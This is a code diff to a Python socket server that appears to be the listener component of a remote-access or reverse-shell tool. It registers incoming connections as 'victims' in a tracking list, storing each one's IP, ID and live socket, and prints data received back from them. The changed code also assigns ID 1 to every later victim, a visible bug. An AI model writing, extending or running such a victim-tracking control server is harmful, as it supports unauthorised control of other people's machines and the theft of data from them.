@@ -6,9 +6,10 @@ import threading
 from colorama import Fore, Back, Style
 import sys
 
-def connection(addr):
-    print("")
-    print(Fore.GREEN+"Connection received from "+str(addr)+". Press Enter to Continue"+Style.RESET_ALL)
+'''def listen_for_stuff(conn):
+    while 1:
+        ans = conn.recv(1024).decode()
+        sys.stdout.write(ans)'''
 
 def on_new_client(conn, addr):
     addr = str(addr).split(',')
@@ -16,23 +17,35 @@ def on_new_client(conn, addr):
     addr = addr[2:]
     addr = addr[:-1]
     if victims.VICTIM_CTR == 0:
+        print("")
+        print("Connection from", addr)
+        new_con = {
+            "IP": str(addr),
+            "ID": 1,
+            "Connection": conn
+        }
         victims.VICTIM_CTR+=1
-        victims.VICTIM_LIST[0]['IP'] = str(addr)
-        victims.VICTIM_LIST[0]['ID'] = 1
-        victims.VICTIM_LIST[0]['CONN'] = conn
-        
-    
+        victims.VICTIM_LIST[0] = new_con
+
+           
     else:
         is_there = 0
         for connections in victims.VICTIM_LIST:
-            if connections["IP"] == str(addr):
+            if connections["Connection"] == conn:
                 is_there = 1
+                ans = conn.recv(1024).decode()
+                sys.stdout.write(ans)
         if is_there == 0:
+            print("")
+            print("Connection from", addr)
             victims.VICTIM_CTR+=1
-            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['IP'] = str(addr)
-            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['ID'] = victims.VICTIM_CTR
-            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['CONN'] = conn 
-            connection(addr)
+            new_con = {
+            "IP": str(addr),
+            "ID": 1,
+            "Connection": conn
+        }
+            victims.VICTIM_LIST[victims.VICTIM_CTR - 1] = new_con
+            
     
 
 def create_server(ip, port):
